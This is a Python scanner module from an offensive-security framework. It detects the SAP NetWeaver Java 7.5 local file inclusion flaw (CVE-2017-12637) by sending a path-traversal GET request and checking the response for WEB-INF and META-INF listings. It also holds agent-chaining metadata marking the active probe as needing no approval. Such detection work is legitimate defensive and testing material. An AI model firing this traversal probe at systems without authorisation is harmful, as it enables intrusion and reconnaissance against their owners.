#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SAP NetWeaver Application Server Java 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SAP NetWeaver Application Server Java 7.5 - Local File Inclusion Detection',
        'description': 'SAP NetWeaver Application Server Java 7.5 is susceptible to local file inclusion in scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS. This can allow remote attackers to read arbitrary files via a .. (dot dot) in the query string, as exploited in the wild in August 2017, aka SAP Security Note 2486657.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'sap', 'lfi', 'java', 'traversal', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_SAP-Bugs-The-Phantom-Security.pdf',
            'https://web.archive.org/web/20170807202056/http://www.sh0w.top/index.php/archives/7/',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-12637',
            'http://www.sh0w.top/index.php/archives/7/',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2017-12637',
    }

    def run(self):
        r = self.http_request(method="GET", path='/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('WEB-INF', 'META-INF',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="SAP NetWeaver Application Server Java 7.5 - Local File Inclusion detected",
                path='/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..',
            )
            return True
        return False

